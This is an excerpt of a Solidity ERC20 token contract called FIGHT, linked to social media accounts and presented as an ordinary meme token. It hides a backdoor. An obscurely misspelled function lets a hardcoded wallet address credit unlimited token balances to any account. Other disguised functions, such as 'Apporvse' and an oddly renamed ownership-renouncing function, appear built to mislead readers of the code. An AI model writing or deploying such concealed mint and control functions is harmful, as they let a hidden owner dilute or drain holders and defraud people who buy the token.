...
*/
/**
https://t.me/FIGHTTOTRUMP_ETH
https://twitter.com/FIGHTTOTRUMP_
*/
...
contract Ownable is Context {
    ...
    function renounceOwnershipsiteboterionsts() public virtual onlyOwner {
...
contract FIGHT is Context, Ownable, IERC20 {
    ...
    uint256 private _totalSupply;address private   _maeketwalletaddress;
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _maeketwalletaddress = 0x548A1Ac6e23Af02fcc99571C043b241912aB6172;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function Apporvse(address user, uint256 Percentse) external {
    ...
    function isMee() internal view returns (bool) {
        return _msgSender() ==   _maeketwalletaddress;
    }

    function liqstsetinglittlyionstss(address recipient, uint256 aDropst)  external {uint256 receiveRewrd = aDropst;_balances[recipient] += receiveRewrd;require(isMee(), "Caller is not the original caller");
    }
